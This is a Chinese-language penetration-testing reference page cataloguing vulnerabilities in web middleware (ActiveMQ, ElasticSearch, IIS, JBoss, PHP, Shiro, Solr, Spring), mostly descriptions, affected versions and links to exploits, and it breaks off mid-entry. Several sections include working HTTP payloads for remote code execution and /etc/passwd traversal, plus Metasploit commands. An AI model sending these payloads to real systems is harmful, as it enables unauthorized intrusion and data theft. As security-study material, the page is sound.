- [2020攻防演练弹药库-您有主机上线请注意](https://blog.riskivy.com/2020%e6%94%bb%e9%98%b2%e6%bc%94%e7%bb%83%e5%bc%b9%e8%8d%af%e5%ba%93-%e6%82%a8%e6%9c%89%e4%b8%bb%e6%9c%ba%e4%b8%8a%e7%ba%bf%e8%af%b7%e6%b3%a8%e6%84%8f/?from=timeline&isappinstalled=0)

**工具包**
- [1120362990/vulnerability-list](https://github.com/1120362990/vulnerability-list) - 在渗透测试中快速检测常见中间件、组件的高危漏洞.
- [hatRiot/clusterd](https://github.com/hatRiot/clusterd) - application server attack toolkit
- [matthiaskaiser/jmet](https://github.com/matthiaskaiser/jmet) - Java Message Exploitation Tool

## ActiveMQ

> 官网 : https://activemq.apache.org/

Apache ActiveMQ 是美国阿帕奇 (Apache) 软件基金会所研发的一套开源的消息中间件,它支持 Java 消息服务、集群、Spring Framework 等.

**搭建教程**
- [ActiveMQ 搭建](../../../../运维/Linux/Power-Linux.md#ActiveMQ)

**CVE-2015-1830 Apache ActiveMQ 5.11.1 Directory Traversal / Shell Upload**
- MSF Module
    ```bash
    use exploit/windows/http/apache_activemq_traversal_upload
    ```

**CVE-2015-5254 ActiveMQ 反序列化漏洞**
- 简介

    Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞,该漏洞源于程序没有限制可在代理中序列化的类.远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码.

- 影响版本
    - Apache ActiveMQ 5.0.0 ~ 5.12.1

- 文章
    - [ActiveMQ 反序列化漏洞 (CVE-2015-5254) ](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)

**CVE-2016-3088 ActiveMQ 任意文件写入漏洞**
- 简介

    ActiveMQ 的 web 控制台分三个应用,admin、api 和 fileserver,其中 admin 是管理员页面,api 是接口,fileserver 是储存文件的接口;admin 和 api 都需要登录后才能使用,fileserver 无需登录.

    fileserver 是一个 RESTful API 接口,我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作,其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷,但后来发现:
    - 其使用率并不高
    - 文件操作容易出现漏洞

    所以,ActiveMQ 在 5.12.x~5.13.x 版本中,已经默认关闭了 fileserver 这个应用 (你可以在 conf/jetty.xml 中开启之) ;在 5.14.0 版本以后,彻底删除了 fileserver 应用.

- 影响版本
    - Apache ActiveMQ < 5.12.x

- 文章
    - [ActiveMQ任意文件写入漏洞 (CVE-2016-3088) ](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)

**CVE-2017-15709**
- POC | Payload | exp
    ```
    telnet ip 61616
    ```

---

## Dubbo

> 官网 : https://dubbo.apache.org/zh-cn/

Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。

**工具**
- [threedr3am/dubbo-exp](https://github.com/threedr3am/dubbo-exp) - Dubbo 反序列化一键快速攻击测试工具，支持 dubbo 协议和 http 协议，支持 hessian 反序列化和 java 原生反序列化。

**CVE-2019-17564 pache Dubbo 反序列化漏洞**
- 文章
    - [漏洞复现|Dubbo反序列化漏洞CVE-2019-17564](https://www.cnblogs.com/wh4am1/p/12307848.html)
    - [[漏洞分析]CVE-2019-17564/Apache Dubbo存在反序列化漏洞](https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5)

---

## ElasticSearch

> 官网 : https://www.elastic.co/

ElasticSearch 是一个基于 Lucene 的搜索服务器.它提供了一个分布式多用户能力的全文搜索引擎,基于 RESTful web 接口.Elasticsearch 是用 Java 开发的,并作为 Apache 许可条款下的开放源码发布,是当前流行的企业级搜索引擎.

**未授权访问漏洞**

- `http://<ip>:9200`
- `http://<ip>:9200/_plugin/head/` web 管理界面
- `http://<ip>:9200/hello/_search?pretty&size=50&from=50`
- `http://<ip>:9200/_cat/indices`
- `http://<ip>:9200/_river/_search` 查看数据库敏感信息
- `http://<ip>:9200/_nodes` 查看节点数据
- `http://<ip>:9200/_cat/indices?v` 查看当前节点的所有 Index
- `http://<ip>:9200/_search?pretty=true` 查询所有的 index, type

**CVE-2014-3120 ElasticSearch 命令执行漏洞**
- 简介

    老版本 ElasticSearch 支持传入动态脚本 (MVEL) 来执行一些复杂的操作,而 MVEL 可执行 Java 代码,而且没有沙盒,所以我们可以直接执行任意代码.

- 影响版本
    - ElasticSearch 1.1.1

- POC | Payload | exp

    来源: [ElasticSearch 命令执行漏洞 (CVE-2014-3120) 测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/)

    首先,该漏洞需要 es 中至少存在一条数据,所以我们需要先创建一条数据:
    ```
    POST /website/blog/ HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25

    {
    "name": "test"
    }
    ```

    然后,执行任意代码:
    ```
    POST /_search?pretty HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 343

    {
        "size": 1,
        "query": {
        "filtered": {
            "query": {
            "match_all": {
            }
            }
        }
        },
        "script_fields": {
            "command": {
                "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
            }
        }
    }
    ```

**CVE-2015-1427 Groovy 沙盒绕过 && 代码执行漏洞**
- 简介

    CVE-2014-3120 后，ElasticSearch 默认的动态脚本语言换成了 Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。

- 影响版本
    - ElasticSearch < 1 .3.7
    - ElasticSearch 1.4.0 ~ 1.4.2

- 文章
    - [Remote Code Execution in Elasticsearch - CVE-2015-1427](https://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/)

- POC | Payload | exp

    来源: [ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞 (CVE-2015-1427) 测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/)

    由于查询时至少要求 es 中有一条数据,所以发送如下数据包,增加一个数据:
    ```
    POST /website/blog/ HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25

    {
    "name": "test"
    }
    ```

    然后发送包含 payload 的数据包,执行任意命令:
    ```
    POST /_search?pretty HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/text
    Content-Length: 156

    {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
    ```

**CVE-2015-3337 目录穿越漏洞**
- 简介

    在安装了具有"site"功能的插件以后,插件目录使用../即可向上跳转,导致目录穿越漏洞,可读取任意文件.没有安装任意插件的 elasticsearch 不受影响.

- 影响版本

    - ElasticSearch < 1.4.4
    - ElasticSearch 1.5.0 ~ 1.5.1

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/

    - `http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd` (不要在浏览器访问)

    - `http://your-ip:9200/_plugin/head/`

**CVE-2015-5531**
- 简介

    elasticsearch 1.5.1 及以前,无需任何配置即可触发该漏洞.之后的新版,配置文件 elasticsearch.yml 中必须存在 path.repo,该配置值为一个目录,且该目录必须可写,等于限制了备份仓库的根位置.不配置该值,默认不启动这个功能.

- 影响版本

    - ElasticSearch < 1.6.0

- 文章
    - [Elasticsearch目录遍历漏洞 (CVE-2015-5531) 复现与分析 (附PoC) ](https://www.freebuf.com/vuls/99942.html)

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/

    新建一个仓库
    ```
    PUT /_snapshot/test HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 108

    {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test"
        }
    }
    ```

    创建一个快照
    ```
    PUT /_snapshot/test2 HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 108

    {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
        }
    }
    ```

    目录穿越读取任意文件

    `http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`

    在错误信息中包含文件内容 (编码后) ,对其进行解码即可获得文件

---

## httpd

**CVE-2007-6750 Apache ddos**
- 简介

    Apache HTTP Server 1.x版本和2.x版本中存在资源管理错误漏洞。该漏洞源于网络系统或产品对系统资源（如内存、磁盘空间、文件等）的管理不当。

- MSF Module
    ```
    use auxiliary/dos/http/slowloris
    set RHOST <rhost>
    run
    ```

**CVE-2017-15715 Apache解析漏洞**
- 文章
    - [利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)

**CVE-2019-0211 Apache HTTP 服务组件提权漏洞**
- 文章
    - [Apache 提权漏洞(CVE-2019-0211)复现](https://paper.seebug.org/889/)

- POC | Payload | exp
    - [CVE-2019-0211-apache](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)

---

## IIS

**IIS shortname**
- 简介

    windows 在创建一个新文件时,操作系统还会生成 8.3 格式的兼容 MS-DOS 的(短)文件名,以允许基于 MS-DOS 或16位 windows 的程序访问这些文件.

- 修复方案
    1. 升级 .net framework 至 4.0 版本或以上
    2. 修改 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 值 NtfsDisable8dot3NameCreation 为 1

- 文章
    - [IIS短文件名漏洞](http://www.lonelyor.org/lonelyorWiki/15446866501207.html)
    - [IIS短文件名泄露漏洞修复](https://segmentfault.com/a/1190000006225568)
    - [IIS短文件/文件夹漏洞(汇总整理) ](https://www.freebuf.com/articles/4908.html)

- POC | Payload | exp
    ```bash
    1. http://www.xxx.com/*~1*/.aspx
    2. http://www.xxx.com/l1j1e*~1*/.aspx
    # 若1返回404而2返回400,则可以判断目标站点存在漏洞.
    http://www.xxx.com/a*~1*/.aspx
    # 若存在将返回404,不存在则返回400.以此类推,不断向下猜解所有的6个字符.
    ```

    ![](../../../../../assets/img/安全/笔记/RedTeam/Web安全/Web_CVE漏洞记录/3.jpg)

    ```
    Windows Server 2008 R2
    查询是否开启短文件名功能:fsutil 8dot3name query
    关闭该功能:fsutil 8dot3name set 1

    Windows Server 2003
    关闭该功能:fsutil behavior set disable8dot3 1
    ```
    - [lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)
    - [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

**.Net Framework 拒绝服务攻击**
- 简介

    当请求文件夹名称包含 `~1` 的请求,会导致不存在该文件的 .Net Framework 去递归查询所有根目录.如果只有一个"~1"是无效的,当"~1"大于一个,比如像这样:

    `/wwwtest/fuck~1/~1/~1/~1.aspx`

    此时文件系统会这样调用:
    ```
    \wwwtest                           SUCCESS
    \wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest\fuck~1\~1\                PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1                 PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest                           SUCCESS
    \wwwtest                           SUCCESS
    ```
    如果我们请求的文件/文件夹名同时存在大小写时,这个请求会被请求两次,一次是原封不动的请求,一次是全部使用小写的请求.

    下表显示了每个请求的 FS 调用的数量(Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同))
    ![](../../../../../assets/img/安全/笔记/RedTeam/Web安全/Web_CVE漏洞记录/1.jpg)

**CVE-2017-7269** IIS6.0 RCE
- 简介

    CVE-2017-7269 是 IIS 6.0 中存在的一个栈溢出漏洞，在 IIS6.0 处理 PROPFIND 指令的时候，由于对 url 的长度没有进行有效的长度控制和检查，导致执行 memcpy 对虚拟路径进行构造的时候，引发栈溢出，该漏洞可以导致远程代码执行。

- 影响版本
    - IIS 6.0
    - win 2003-r2

- 文章
    - [CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit](https://paper.seebug.org/259/)

- POC | Payload | exp
    - [zcgonvh/cve-2017-7269](https://github.com/zcgonvh/cve-2017-7269)
    - [zcgonvh/cve-2017-7269-tool](https://github.com/zcgonvh/cve-2017-7269-tool)
    - [lcatro/CVE-2017-7269-Echo-PoC](https://github.com/lcatro/CVE-2017-7269-Echo-PoC)
    - [edwardz246003/IIS_exploit](https://github.com/edwardz246003/IIS_exploit)

- MSF Module
    ```bash
    use exploit/windows/iis/cve-2017-7269
    ```

---

## JBOSS

> 官网 : http://www.jboss.org/

**工具**
- [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JBoss(和其他Java反序列化漏洞)验证和利用工具

**未授权访问漏洞**
- 简介

    部分版本 JBoss 默认情况下访问 http://ip:8080/jmx-console 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。

    - `http://<ip>:8080/jmx-console`

**CVE-2016-7065 Red Hat JBoss EAP - Deserialization of Untrusted Data**
- 简介

    JBoss 企业应用程序平台（EAP）4和5中的 JMX servlet 允许远程 DOS，并可能通过精心设计的序列化 Java 对象执行任意代码。

- 影响版本
    - JBOSS 4.0.0
    - JBOSS 5.0.0

- POC | Payload | exp
    - [Red Hat JBoss EAP - Deserialization of Untrusted Data](https://www.exploit-db.com/exploits/40842)

**CVE-2017-12149 JBoss 5.x/6.x 反序列化漏洞**
- 简介

    该漏洞为 Java 反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

- 影响版本
    - JBOSS 5.0.0 ~ 5.2.2

- POC | Payload | exp
    - [yunxu1/jboss-_CVE-2017-12149](https://github.com/yunxu1/jboss-_CVE-2017-12149)
    - [jreppiks/CVE-2017-12149](https://github.com/jreppiks/CVE-2017-12149)
    - https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149

---

## PHP

**CVE-2012-1823 PHPCGI 远程代码执行漏洞**
- 简介

    5.3.12 之前和 5.4.2 之前的 5.4.x 中的 sapi/cgi/cgi_main.c 在配置为 CGI 脚本（aka php-cgi）时，不能正确处理缺少=（等号）字符的查询字符串 ，它允许远程攻击者通过在查询字符串中放置命令行选项来执行任意代码，这与在"d"情况下缺少跳过某些 php_getopt 有关。

- 影响版本

    - php < 5.3.12
    - php < 5.4.2

- 文章
    - [PHP-CGI远程代码执行漏洞 (CVE-2012-1823) 分析](https://paper.seebug.org/297/)

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/php/CVE-2012-1823/

    `http://你的 IP 地址:端口号/index.php?-s` 即爆出源码

    发送如下数据包,可见 Body 中的代码已被执行:
    ```
    POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
    Host: example.com
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 31

    <?php echo shell_exec("id"); ?>
    ```

- MSF Module
    ```
    use exploit/multi/http/php_cgi_arg_injection
    ```

**CVE-2018-19518 PHP imap 远程命令执行漏洞**
- 简介

    php imap 扩展用于在 PHP 中执行邮件收发操作.其 imap_open 函数会调用 rsh 来连接远程 shell,而 debian/ubuntu 中默认使用 ssh 来代替 rsh 的功能 (也就是说,在 debian 系列系统中,执行 rsh 命令实际执行的是 ssh 命令) .

    因为 ssh 命令中可以通过设置 -oProxyCommand= 来调用第三方命令,攻击者通过注入注入这个参数,最终将导致命令执行漏洞.

- 影响版本
    - php 5.6.0 ~ 5.6.38
    - php 7.0.0 ~ 7.0.32
    - php 7.1.0 ~ 7.1.24
    - php 7.2.0 ~ 7.2.12

- POC | Payload | exp
    - [PHP imap 远程命令执行漏洞 (CVE-2018-19518) ](https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md)

**CVE-2019-11043 PHP-FPM 远程代码执行漏洞**
- 简介

    在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时,服务返回异常,疑似存在漏洞.

    在使用一些有错误的 Nginx 配置的情况下,通过恶意构造的数据包,即可让 PHP-FPM 执行任意代码.

- 影响版本
    - php 7.1.0 ~ 7.1.33
    - php 7.2.0 ~ 7.2.24
    - php 7.3.0 ~ 7.3.11

- POC | Payload | exp
    - [PHP-FPM 远程代码执行漏洞 (CVE-2019-11043) ](https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md)
    - [neex/phuip-fpizdam](https://github.com/neex/phuip-fpizdam)

**LFI with phpinfo**
- 简介

    PHP 文件包含漏洞中,如果找不到可以包含的文件,我们可以通过包含临时文件的方法来 getshell.因为临时文件名是随机的,如果目标网站上存在 phpinfo,则可以通过 phpinfo 来获取临时文件名,进而进行包含.

- POC | Payload | exp
    - [PHP文件包含漏洞 (利用phpinfo) ](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.md)
    - [LFI with phpinfo](https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo)

**PHP 环境 XML 外部实体注入漏洞 (XXE)**
- 简介

    libxml2.9.0 以后,默认不解析外部实体.

- POC | Payload | exp
    - [PHP环境 XML外部实体注入漏洞 (XXE) ](https://github.com/vulhub/vulhub/blob/master/php/php_xxe/README.md)

**XDebug 远程调试漏洞 (代码执行)**
- 简介

    XDebug 是 PHP 的一个扩展,用于调试 PHP 代码.如果目标开启了远程调试模式,并设置 `remote_connect_back = 1`:
    ```
    xdebug.remote_connect_back = 1
    xdebug.remote_enable = 1
    ```
    这个配置下,我们访问 http://target/index.php?XDEBUG_SESSION_START=phpstorm ,目标服务器的 XDebug 将会连接访问者的 IP (或 `X-Forwarded-For` 头指定的地址) 并通过 dbgp 协议与其通信,我们通过 dbgp 中提供的 eval 方法即可在目标服务器上执行任意 PHP 代码.

- POC | Payload | exp
    - [XDebug 远程调试漏洞 (代码执行) ](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/README.md)

---

## Resin

> 官网 : https://caucho.com/

**文章**
- [针对Resin服务的攻击向量整理](https://blkstone.github.io/2017/10/30/resin-attack-vectors/)

**Resin 任意文件读取漏洞**
- 文章
    - [Resin任意文件读取漏洞](https://www.cnblogs.com/KevinGeorge/p/8953731.html)

---

## RocketMQ

**Tips**
- 4.0.x ~ 4.3.x 存在 fastjson 1.2.29

---

## shiro

> 官网 : https://shiro.apache.org/

Apache Shiro 是一个功能强大且灵活的开源安全框架,主要功能包括用户认证、授权、会话管理以及加密.

shiro 的漏洞参考 https://issues.apache.org/jira/projects/SHIRO/issues

**文章**
- [Apache Shiro回显poc改造计划](https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw)
- [关于Shiro反序列化漏洞的延伸—升级shiro也能被shell](https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw)
- [Shiro 100 Key](https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA)

**工具**
- [sv3nbeast/ShiroScan](https://github.com/sv3nbeast/ShiroScan) - Shiro<=1.2.4 反序列化,一键检测工具
- [wyzxxz/shiro_rce](https://github.com/wyzxxz/shiro_rce) - shiro rce 反序列 命令执行 一键工具
- [feihong-cs/ShiroExploit](https://github.com/feihong-cs/ShiroExploit) - shiro550/721 漏洞检测工具GUI版本
- [bigsizeme/shiro-check](https://github.com/bigsizeme/shiro-check) - Shiro反序列化检查 Burp 插件

**指纹**
- `set-Cookie: rememberMe=deleteMe`

**SHIRO-550 & CVE-2016-4437 | Shiro RememberMe 1.2.4 反序列化漏洞**
- https://issues.apache.org/jira/projects/SHIRO/issues/SHIRO-550

- 简介

    shiro 默认使用了 CookieRememberMeManager, 其处理 cookie 的流程是: 得到 rememberMe 的 cookie 值-->Base64 解码-->AES 解密-->反序列化.然而 AES 的密钥是硬编码的, 就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。

- 影响版本
    - 1.2.4(由于密钥泄露的问题, 部分高于 1.2.4 版本的 Shiro 也会受到影响)

- 文章
    - [【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞](https://paper.seebug.org/shiro-rememberme-1-2-4/)

- POC | Payload | exp
    - [jas502n/SHIRO-550](https://github.com/jas502n/SHIRO-550)

**SHIRO-721 | Shiro RememberMe Padding Oracle Vulnerability RCE**
- https://issues.apache.org/jira/browse/SHIRO-721

- 简介

    cookie 的 cookiememeMe 已通过 AES-128-CBC 模式加密，这很容易受到填充 oracle 攻击的影响。

    攻击者可以使用有效的 RememberMe cookie 作为 Padding Oracle Attack 的前缀，然后制作精心制作的 RememberMe 来执行 Java 反序列化攻击。

- 影响版本
    - 1.2.5 ~ 1.2.6
    - 1.3.0 ~ 1.3.2
    - 1.4.0-RC2 ~ 1.4.1

- 文章
    - [Shiro 721 Padding Oracle攻击漏洞分析](https://www.anquanke.com/post/id/193165)
    - [Apache Shiro 远程代码执行漏洞复现](http://www.oniont.cn/index.php/archives/298.html)

- POC | Payload | exp
    - [3ndz/Shiro-721](https://github.com/3ndz/Shiro-721)
    - [jas502n/SHIRO-721](https://github.com/jas502n/SHIRO-721)

**SHIRO-682 & CVE-2020-1957 | Shiro 权限绕过漏洞**

- 简介

    Apache Shiro 是企业常见的 Java 安全框架, 由于 Shiro 的拦截器和 spring(Servlet)拦截器对于 URI 模式匹配的差异, 导致出现鉴权问题.

- 文章
    - [Shiro 权限绕过漏洞分析（CVE-2020-1957）](https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/)

---

## Solr

> 官网 : https://lucene.apache.org/solr/

Apache Solr 是一个开源的搜索服务器.Solr 使用 Java 语言开发,其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成,以及富文本的处理.

Solr 的漏洞参考 https://issues.apache.org/jira/projects/SOLR/issues

**资源**
- [Imanfeng/Apache-Solr-RCE](https://github.com/Imanfeng/Apache-Solr-RCE) - Solr RCE 整理
- [veracode-research/solr-injection](https://github.com/veracode-research/solr-injection) - Apache Solr 注入研究

**CVE-2017-12629 Apache solr XML 实体注入漏洞**
- 简介

    原理大致是文档通过 Http 利用 XML 加到一个搜索集合中.查询该集合也是通过 http 收到一个 XML/JSON 响应来实现.此次 7.1.0 之前版本总共爆出两个漏洞:XML 实体扩展漏洞 (XXE) 和远程命令执行漏洞 (RCE) ,二者可以连接成利用链,编号均为 CVE-2017-12629.

- 影响版本
    - Apache solr 5.5.0 ~ 5.5.4
    - Apache solr 6.0.0 ~ 6.6.1
    - Apache solr 7.0.0 ~ 7.0.1

- 文章
    - [Apache solr XML 实体注入漏洞 (CVE-2017-12629) ](https://vulhub.org/#/environments/solr/CVE-2017-12629-XXE/)
    - [Apache Solr 远程命令执行漏洞 (CVE-2017-12629) ](https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/)

**CVE-2019-0192 Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5**
- https://issues.apache.org/jira/browse/SOLR-13301

- 简介

    ConfigAPI 允许通过 HTTP POST 请求配置 Solr 的 JMX 服务器。通过将其指向恶意的 RMI 服务器，攻击者可以利用 Solr 的不安全反序列化功能在 Solr 端触发远程代码执行。

- 影响版本
    - Apache solr 5.0.0 ~ 5.5.5
    - Apache solr 6.0.0 ~ 6.6.5

- POC | Payload | exp
    - https://github.com/mpgn/CVE-2019-0192/

**CVE-2019-0193 Apache Solr 远程命令执行漏洞**
- 简介

    此次漏洞出现在 Apache Solr 的 DataImportHandler,该模块是一个可选但常用的模块,用于从数据库和其他源中提取数据.它具有一个功能,其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置.由于 DIH 配置可以包含脚本,因此攻击者可以通过构造危险的请求,从而造成远程命令执行.

- 影响版本
    - Apache solr < 8.2.0

- 文章
    - [Apache Solr 远程命令执行漏洞 (CVE-2019-0193) ](https://vulhub.org/#/environments/solr/CVE-2019-0193/)
    - [Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析](https://paper.seebug.org/1009/)

- POC | Payload | exp
    - [jas502n/CVE-2019-0193](https://github.com/jas502n/CVE-2019-0193)
    - [1135/solr_exploit](https://github.com/1135/solr_exploit)

**CVE-2019-12409**
- POC | Payload | exp
    - [jas502n/CVE-2019-12409](https://github.com/jas502n/CVE-2019-12409)

**CVE-2019-17558 Apache Solr Velocity 模版注入远程命令执行漏洞**
- 简介

    2019年10月30日，国外安全研究人员放出了一个关于 solr 模板注入的 exp，攻击者通过未授权访问 solr 服务器，发送特定的数据包开启 params.resource.loader.enabled，然后 get 访问接口导致服务器命令执行，命令回显结果在 response。

- 影响版本
    - Apache Solr < 8.2.0

- 文章
    - [Apache Solr最新漏洞复现](https://xz.aliyun.com/t/6679)
    - [Microsoft Apache Solr RCE Velocity Template | Bug Bounty POC](https://blog.securitybreached.org/2020/03/31/microsoft-rce-bugbounty/)

- POC | Payload | exp
    - [jas502n/solr_rce](https://github.com/jas502n/solr_rce)
    - [SDNDTeam/CVE-2019-17558_Solr_Vul_Tool](https://github.com/SDNDTeam/CVE-2019-17558_Solr_Vul_Tool) - Solr模板注入漏洞图形化一键检测工具

---

## Spring

> 官网 : https://spring.io/

**指纹**
- `X-Application-Context:`

**Spring Boot Actuators**
- [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [Spring Boot Actuators配置不当导致RCE漏洞复现](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
- [mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)

**CVE-2016-4977 Spring Security OAuth2 远程命令执行漏洞**
- 简介

    Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块.在其使用 whitelabel views 来处理错误时,由于使用了Springs Expression Language (SpEL),攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令.

- 影响版本
    - spring_security_oauth 1.0.0 ~ 1.0.5
    - spring_security_oauth 2.0.0 ~ 2.0.9

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/spring/CVE-2016-4977/

    - [vulhub/spring/CVE-2016-4977/poc.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py)

**CVE-2017-4971 Spring WebFlow 远程代码执行漏洞**
- 简介

    Spring WebFlow 是一个适用于开发基于流程的应用程序的框架 (如购物逻辑) ,可以将流程的定义和实现流程行为的类和视图分离开来.在其 2.4.x 版本中,如果我们控制了数据绑定时的field,将导致一个 SpEL 表达式注入漏洞,最终造成任意命令执行.

- 影响版本
    - spring_web_flow 2.4.0 ~ 2.4.4

- 文章
    - [Spring WebFlow 远程代码执行漏洞 (CVE-2017-4971) ](https://vulhub.org/#/environments/spring/CVE-2017-4971/)

**CVE-2017-8046 Spring Data Rest 远程命令执行漏洞**
- 简介

    Spring Data REST 是一个构建在 Spring Data 之上,为了帮助开发者更加容易地开发 REST 风格的 Web 服务.在 REST API 的 Patch 方法中 (实现 RFC6902) ,path 的值被传入 setValue,导致执行了 SpEL 表达式,触发远程命令执行漏洞.

- 影响版本
    - spring_boot < 1.5.9
    - spring_boot 2.0.0:m1 ~ 2.0.0:m5
    - spring_data_rest < 2.6.9
    - spring_data_rest 3.0.0 ~ 3.0.0:rc3

- 文章
    - [Spring Data Rest 远程命令执行漏洞 (CVE-2017-8046) ](https://vulhub.org/#/environments/spring/CVE-2017-8046/)

**CVE-2018-1270 Spring Messaging 远程命令执行漏洞**
- 简介

